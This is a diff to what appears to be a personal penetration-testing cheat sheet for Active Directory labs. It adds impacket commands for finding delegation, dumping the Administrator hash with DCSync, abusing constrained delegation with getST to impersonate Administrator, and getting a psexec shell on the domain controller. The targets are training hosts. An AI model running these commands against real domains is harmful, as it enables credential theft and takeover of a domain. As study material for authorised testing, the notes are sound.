@@ -73,6 +73,7 @@
     - [Snaffler](#snaffler)
     - [LaZagne](#lazagne)
     - [BloodHound](#bloodhound)
+    - [findDelegation](#finddelegation)
     - [cmd](#cmd)
   - [Linux](#linux-2)
     - [cmd](#cmd-1)
@@ -905,6 +906,12 @@ MATCH p = shortestPath((n)-[*1..]->(c)) WHERE n.name =~ '(?i)ここにUser名.*'
 jq '.nodes[].label'
 ```
 
+### findDelegation
+```bash
+# vim /etc/hosts
+impacket-findDelegation htb.LOCAL/user:pass
+```
+
 ### cmd
 ```powershell
 # Users file
@@ -1171,8 +1178,18 @@ python krbrelayx.py -s user -hashes :NTLM
 python printerbug.py inlanefreight.local/genWuer:passwd@10.129.205.35 my.inlanefreight.local
 
 # DCsync
+unset KRB5CCNAME
 export KRB5CCNAME=./Administrator.ccache
 impacket-secretsdump dc01.INLANEFREIGHT.LOCAL -k -no-pass -just-dc-user Administrator -just-dc-ntlm
+```
+#### DC-Constrained Delegation
+```bash
+unset KRB5CCNAME
+impacket-getST -spn SRV/DC01 'INLANEFREIGHT.LOCAL/delegrate-User:pass' -impersonate Administrator -dc-ip 10.129.193.100 
+export KRB5CCNAME=./Administrator.ccache
+
+# vim /etc/hosts DC01
+impacket-psexec -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01
 ```
 
 #### RBCD
